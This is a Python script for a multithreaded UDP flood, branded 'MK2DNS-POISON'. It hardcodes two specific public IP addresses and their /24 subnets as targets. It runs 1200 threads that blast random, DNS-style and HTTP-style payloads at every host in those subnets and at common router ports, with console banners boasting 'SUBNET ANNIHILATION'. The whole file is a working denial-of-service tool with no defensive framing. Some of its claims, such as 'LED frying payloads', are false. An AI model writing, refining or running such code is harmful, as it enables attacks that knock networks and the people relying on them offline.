import socket
import threading
import time
import random
import ipaddress

# ==================== TARGET CONFIGURATION ====================
TARGETS = [
    ("62.109.121.42", 24),     # Primary target with /24 subnet
    ("139.7.81.20", 24),       # Secondary target with /24 subnet
]

# ==================== LAG OPTIMIZATION ENGINE ====================
class LagOptimizer:
    def __init__(self, max_threads=1200):
        self.max_threads = max_threads
        self.active_threads = 0
        self.socket_pools = {}
        self.payload_cache = {}
        self.thread_lock = threading.Lock()
        
    def get_socket_pool(self, target_ip, size=50):
        """Reusable socket pool for each target"""
        if target_ip not in self.socket_pools:
            pool = []
            for _ in range(size):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)  # 128KB buffer
                    sock.settimeout(0.001)
                    pool.append(sock)
                except:
                    pass
            self.socket_pools[target_ip] = pool
        return self.socket_pools[target_ip]
    
    def get_cached_payload(self, payload_type, size):
        """Pre-generated payload cache"""
        key = f"{payload_type}_{size}"
        if key not in self.payload_cache:
            if payload_type == "led":
                self.payload_cache[key] = self._gen_led_payload(size)
            elif payload_type == "dns":
                self.payload_cache[key] = self._gen_dns_payload(size)
            elif payload_type == "http":
                self.payload_cache[key] = self._gen_http_payload(size)
            else:
                self.payload_cache[key] = random.randbytes(size)
        return self.payload_cache[key]
    
    def _gen_led_payload(self, size):
        """LED frying payloads"""
        patterns = [
            bytes([0x00, 0xFF] * (size // 2)),
            bytes([0x55, 0xAA] * (size // 2)),
            bytes([i % 256 for i in range(size)]),
            bytes([random.randint(0, 255) for _ in range(size)]),
        ]
        return random.choice(patterns)
    
    def _gen_dns_payload(self, size):
        """DNS amplification payload"""
        base = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
        domain = b'\x07example\x03com\x00\x00\x01\x00\x01'
        padding = random.randbytes(size - len(base) - len(domain))
        return base + domain + padding
    
    def _gen_http_payload(self, size):
        """HTTP flood payload"""
        base = b'GET / HTTP/1.1\r\nHost: '
        target = random.choice([t[0] for t in TARGETS])
        host = target.encode() + b'\r\n\r\n'
        padding = random.randbytes(size - len(base) - len(host))
        return base + host + padding

# ==================== SUBNET ATTACK ENGINE ====================
class SubnetAttacker:
    def __init__(self, optimizer):
        self.optimizer = optimizer
        self.stats = {
            "target1_packets": 0,
            "target2_packets": 0,
            "subnet_packets": 0,
            "total_packets": 0,
        }
        self.stats_lock = threading.Lock()
    
    def generate_subnet_ips(self, base_ip, prefix):
        """Generate /24 subnet IPs"""
        try:
            network = ipaddress.IPv4Network(f"{base_ip}/{prefix}", strict=False)
            ips = [str(ip) for ip in network.hosts()]
            return ips[:254]  # Limit to 254 hosts
        except:
            return [base_ip]
    
    def subnet_flood_worker(self, worker_id, target_index):
        """Attack entire /24 subnet"""
        base_ip, prefix = TARGETS[target_index]
        subnet_ips = self.generate_subnet_ips(base_ip, prefix)
        
        socket_pool = self.optimizer.get_socket_pool(base_ip)
        if not socket_pool:
            return
        
        while True:
            try:
                # Select random IP from subnet
                target_ip = random.choice(subnet_ips)
                
                # Get cached payload
                payload_type = random.choice(["led", "dns", "http", "random"])
                payload_size = random.choice([64, 128, 256, 512, 1024])
                payload = self.optimizer.get_cached_payload(payload_type, payload_size)
                
                # Select random port
                port = random.randint(1, 65535)
                
                # Get socket from pool
                sock = random.choice(socket_pool)
                
                # SEND WITH ZERO DELAY
                sock.sendto(payload, (target_ip, port))
                
                # Update stats
                with self.stats_lock:
                    if target_index == 0:
                        self.stats["target1_packets"] += 1
                    else:
                        self.stats["target2_packets"] += 1
                    self.stats["subnet_packets"] += 1
                    self.stats["total_packets"] += 1
                    
            except:
                # Socket error - skip and continue
                pass
    
    def direct_target_worker(self, worker_id, target_index):
        """Direct target attack for main IP"""
        target_ip, _ = TARGETS[target_index]
        socket_pool = self.optimizer.get_socket_pool(target_ip)
        
        # Router-specific ports for maximum damage
        ROUTER_PORTS = [53, 80, 443, 7547, 23, 1900, 67, 68, 161, 162, 123, 8080, 8443]
        
        while True:
            try:
                # High-speed payload selection
                payload = random.randbytes(random.choice([64, 128, 256, 512]))
                
                # Attack router-specific ports
                port = random.choice(ROUTER_PORTS)
                
                # Get socket
                sock = random.choice(socket_pool)
                
                # MAXIMUM SPEED - NO DELAYS
                sock.sendto(payload, (target_ip, port))
                
                # Update stats
                with self.stats_lock:
                    if target_index == 0:
                        self.stats["target1_packets"] += 1
                    else:
                        self.stats["target2_packets"] += 1
                    self.stats["total_packets"] += 1
                    
            except:
                pass
    
    def port_scan_flood_worker(self, worker_id, target_index):
        """Port scanning flood attack"""
        base_ip, prefix = TARGETS[target_index]
        subnet_ips = self.generate_subnet_ips(base_ip, prefix)
        
        socket_pool = self.optimizer.get_socket_pool(base_ip)
        
        while True:
            try:
                # Random IP from subnet
                target_ip = random.choice(subnet_ips)
                
                # Scan multiple ports
                for _ in range(random.randint(5, 20)):
                    port = random.randint(1, 65535)
                    payload = random.randbytes(64)
                    
                    sock = random.choice(socket_pool)
                    sock.sendto(payload, (target_ip, port))
                    
                    with self.stats_lock:
                        self.stats["total_packets"] += 1
                        self.stats["subnet_packets"] += 1
                        
            except:
                pass

# ==================== THREAD MANAGEMENT ====================
class ThreadManager:
    def __init__(self, attacker):
        self.attacker = attacker
        self.thread_count = 0
        
    def deploy_threads(self):
        print("[+] DEPLOYING 1200 OPTIMIZED THREADS")
        print(f"[+] TARGET 1: {TARGETS[0][0]}/{TARGETS[0][1]} (~254 hosts)")
        print(f"[+] TARGET 2: {TARGETS[1][0]}/{TARGETS[1][1]} (~254 hosts)")
        print("[+] THREAD DISTRIBUTION:")
        
        # Subnet attack threads (400 per target = 800 total)
        for target_idx in range(len(TARGETS)):
            for i in range(400):
                t = threading.Thread(target=self.attacker.subnet_flood_worker, args=(i, target_idx))
                t.daemon = True
                t.start()
                self.thread_count += 1
        
        # Direct target threads (100 per target = 200 total)
        for target_idx in range(len(TARGETS)):
            for i in range(100):
                t = threading.Thread(target=self.attacker.direct_target_worker, args=(i, target_idx))
                t.daemon = True
                t.start()
                self.thread_count += 1
        
        # Port scan flood threads (100 per target = 200 total)
        for target_idx in range(len(TARGETS)):
            for i in range(100):
                t = threading.Thread(target=self.attacker.port_scan_flood_worker, args=(i, target_idx))
                t.daemon = True
                t.start()
                self.thread_count += 1
        
        print(f"   • Subnet Flood: 800 threads")
        print(f"   • Direct Target: 200 threads")
        print(f"   • Port Scan: 200 threads")
        print(f"[+] TOTAL DEPLOYED: {self.thread_count} threads")
        print("─" * 60)

# ==================== ANONYMOUS LOGGING ====================
def mk2_log():
    print("╔══════════════════════════════════════════════════════════╗")
    print("║               MK2DNS-POISON v3.0 - SUBNET MODE          ║")
    print("║              [ANONYMOUS SUBNET OPERATION]               ║")
    print("╚══════════════════════════════════════════════════════════╝")

def status_log(elapsed, stats, prev_stats):
    # Calculate PPS
    target1_pps = (stats["target1_packets"] - prev_stats["target1_packets"]) / elapsed
    target2_pps = (stats["target2_packets"] - prev_stats["target2_packets"]) / elapsed
    subnet_pps = (stats["subnet_packets"] - prev_stats["subnet_packets"]) / elapsed
    total_pps = (stats["total_packets"] - prev_stats["total_packets"]) / elapsed
    
    # Anonymous military logging
    timestamp = time.strftime("%H:%M:%S")
    print(f"[{timestamp}] OPERATION: SUBNET_ANNIHILATION")
    print(f"├─ PHASE: ACTIVE")
    print(f"├─ DURATION: {int(time.time() - START_TIME)}s")
    print(f"├─ TARGET_1: {int(target1_pps):,}/s")
    print(f"├─ TARGET_2: {int(target2_pps):,}/s") 
    print(f"├─ SUBNET: {int(subnet_pps):,}/s")
    print(f"├─ TOTAL: {int(total_pps):,}/s")
    
    # Attack intensity
    intensity = total_pps / 1000
    if intensity > 80:
        status = "MAXIMUM DESTRUCTION"
    elif intensity > 50:
        status = "CRITICAL OVERLOAD"
    elif intensity > 25:
        status = "HIGH INTENSITY"
    else:
        status = "ENGAGED"
    
    print(f"└─ STATUS: {status}")
    print("─" * 60)
    
    # Warnings
    if intensity > 70:
        print("[!] SUBNET SATURATION DETECTED")
    if target1_pps > 30000 or target2_pps > 30000:
        print("[!] INDIVIDUAL TARGET CRITICAL")

# ==================== MAIN EXECUTION ====================
mk2_log()

# Initialize systems
optimizer = LagOptimizer(max_threads=1200)
attacker = SubnetAttacker(optimizer)
thread_manager = ThreadManager(attacker)

# Deploy threads
thread_manager.deploy_threads()

# Monitoring
START_TIME = time.time()
last_stats = attacker.stats.copy()
last_log_time = time.time()

print("[+] ALL SYSTEMS OPERATIONAL")
print("[+] BEGINNING SUBNET ANNIHILATION")
print("─" * 60)

while True:
    time.sleep(2)  # Log every 2 seconds
    
    current_time = time.time()
    elapsed = current_time - last_log_time
    
    # Get current stats
    with attacker.stats_lock:
        current_stats = attacker.stats.copy()
    
    # Log status
    status_log(elapsed, current_stats, last_stats)
    
    # Update previous stats
    last_stats = current_stats.copy()
    last_log_time = current_time
    
    # Periodic system report
    if int(current_time - START_TIME) % 30 == 0:
        print("[+] SYSTEM REPORT:")
        print(f"   • Active Threads: {thread_manager.thread_count}")
        print(f"   • Socket Pools: {len(optimizer.socket_pools)}")
        print(f"   • Payload Cache: {len(optimizer.payload_cache)} items")
        print(f"   • Total Packets: {current_stats['total_packets']:,}")
        print("─" * 60)
